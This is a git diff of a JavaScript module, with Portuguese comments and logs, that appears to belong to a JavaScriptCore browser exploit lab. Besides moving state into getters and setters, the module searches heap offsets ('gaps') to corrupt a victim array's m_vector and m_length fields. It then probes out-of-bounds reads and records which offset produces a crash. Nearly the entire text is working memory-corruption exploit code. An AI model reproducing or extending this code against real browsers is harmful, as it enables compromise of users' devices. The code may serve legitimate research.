@@ -3,19 +3,26 @@ import { AdvancedInt64 } from './int64.mjs';
 import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
 import * as Core from './core_exploit.mjs';
 import * as Groomer from './heap_groomer.mjs';
-// JSC_OFFSETS é usado diretamente de Core.getJSCOffsets()
 
-export let CURRENT_TEST_GAP = 0;
-export let last_successful_gap = null;
+let _CURRENT_TEST_GAP = 0;
+let _last_successful_gap = null;
 const FNAME_BASE = "VictimCorruptor";
 
+// Getters e Setters para as variáveis de estado do módulo
+export function getCurrentTestGap() { return _CURRENT_TEST_GAP; }
+export function setCurrentTestGap(value) { _CURRENT_TEST_GAP = value; }
+export function getLastSuccessfulGap() { return _last_successful_gap; }
+export function setLastSuccessfulGap(value) { _last_successful_gap = value; }
+export function resetLastSuccessfulGap() { _last_successful_gap = null; }
+
+
 export async function testCorruptKnownGap() {
-    if (last_successful_gap === null) {
+    if (getLastSuccessfulGap() === null) {
         log("Nenhum GAP de sucesso conhecido para testar.", "warn", `${FNAME_BASE}.testCorruptKnownGap`);
         return;
     }
-    log(`Testando corrupção no GAP conhecido: ${last_successful_gap}`, "test", `${FNAME_BASE}.testCorruptKnownGap`);
-    await try_corrupt_fields_for_gap(last_successful_gap);
+    log(`Testando corrupção no GAP conhecido: ${getLastSuccessfulGap()}`, "test", `${FNAME_BASE}.testCorruptKnownGap`);
+    await try_corrupt_fields_for_gap(getLastSuccessfulGap());
 }
 
 export async function try_corrupt_fields_for_gap(current_gap_to_test) {
@@ -52,7 +59,8 @@ export async function try_corrupt_fields_for_gap(current_gap_to_test) {
         let val = Groomer.victim_object[0];
         log(`       ACESSO A victim_object[0] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
     } catch (e) {
-        log(`       CRASH/ERRO ESPERADO (m_vector): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; result.mvector_corrupted = true; last_successful_gap = current_gap_to_test;
+        log(`       CRASH/ERRO ESPERADO (m_vector): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; result.mvector_corrupted = true; 
+        setLastSuccessfulGap(current_gap_to_test); // <<< USA SETTER
         log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_VECTOR)!`, "vuln", FNAME_TRY_FIELDS); return result;
     }
     if (original_mvector instanceof AdvancedInt64 && !original_mvector.isZero() && result.mvector_corrupted) {
@@ -80,7 +88,7 @@ export async function try_corrupt_fields_for_gap(current_gap_to_test) {
         } else { log(`       FALHA: m_length NÃO foi sobrescrito. Lido: ${toHexS1(written_mlength)}`, "warn", FNAME_TRY_FIELDS); }
         if (result.mlength_corrupted && Groomer.victim_object) {
             try { const far_index = Groomer.victim_object.length + 100000; log(`       Tentando acessar victim_object[${far_index}] (m_length=${toHexS1(large_mlength_val)})...`, "critical", FNAME_TRY_FIELDS); let val = Groomer.victim_object[far_index]; log(`       ACESSO A victim_object[${far_index}] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
-            } catch (e) { log(`       CRASH/ERRO ESPERADO (m_length): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; last_successful_gap = current_gap_to_test; log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_LENGTH)!`, "vuln", FNAME_TRY_FIELDS); }
+            } catch (e) { log(`       CRASH/ERRO ESPERADO (m_length): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; setLastSuccessfulGap(current_gap_to_test); log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_LENGTH)!`, "vuln", FNAME_TRY_FIELDS); } // <<< USA SETTER
         }
         if (typeof original_mlength === 'number' && result.mlength_corrupted) {
             log(`       Restaurando m_length original: ${toHexS1(original_mlength)}`, "tool", FNAME_TRY_FIELDS);
@@ -100,16 +108,16 @@ export async function findAndCorruptVictimFields_Iterative() {
     log(`   Iniciando busca de GAP de ${gapStart} a ${gapEnd}, passo ${gapStep}.`, "info", FNAME); await PAUSE_LAB(1000);
     let best_gap_info_no_crash = null;
     for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
-        if (last_successful_gap !== null) { log(`GAP de sucesso (${last_successful_gap}) já encontrado. Interrompendo.`, "good", FNAME); break; }
-        log(`Testando GAP: ${current_gap}`, "test", FNAME); CURRENT_TEST_GAP = current_gap;
+        if (getLastSuccessfulGap() !== null) { log(`GAP de sucesso (${getLastSuccessfulGap()}) já encontrado. Interrompendo.`, "good", FNAME); break; } // <<< USA GETTER
+        log(`Testando GAP: ${current_gap}`, "test", FNAME); setCurrentTestGap(current_gap); // <<< USA SETTER
         const result = await try_corrupt_fields_for_gap(current_gap);
-        if (result.crashed_or_error) { log(`CORRUPÇÃO BEM SUCEDIDA (CRASH/ERRO) com GAP = ${last_successful_gap}!`, "critical", FNAME); break; }
+        if (result.crashed_or_error) { log(`CORRUPÇÃO BEM SUCEDIDA (CRASH/ERRO) com GAP = ${getLastSuccessfulGap()}!`, "critical", FNAME); break; } // <<< USA GETTER
         else if (result.mvector_corrupted || result.mlength_corrupted) { if (!best_gap_info_no_crash) best_gap_info_no_crash = result; log(`   GAP ${current_gap}: Campos CORROMPIDOS SEM CRASH.`, "good", FNAME); }
         else if (result.mvector_read !== "N/A" && !result.mvector_read.toLowerCase().includes("aaaa")) { if (!best_gap_info_no_crash) best_gap_info_no_crash = result; log(`   GAP ${current_gap}: m_vector válido LIDO.`, "info", FNAME); }
         await PAUSE_LAB(300); if (document.hidden) { log("Busca abortada.", "warn", FNAME); break; }
         if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && (current_gap + gapStep) !== gapEnd ) { current_gap = gapEnd - gapStep; }
     }
-    if (last_successful_gap !== null) { log(`Busca concluída. GAP PROMISSOR: ${last_successful_gap}`, "vuln", FNAME); }
+    if (getLastSuccessfulGap() !== null) { log(`Busca concluída. GAP PROMISSOR: ${getLastSuccessfulGap()}`, "vuln", FNAME); } // <<< USA GETTER
     else if (best_gap_info_no_crash) { log("Busca concluída. Nenhum crash. Melhor candidato (sem crash): GAP " + best_gap_info_no_crash.gap, "warn", FNAME); }
     else { log("Busca concluída. Nenhuma corrupção confirmada.", "error", FNAME); }
     log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
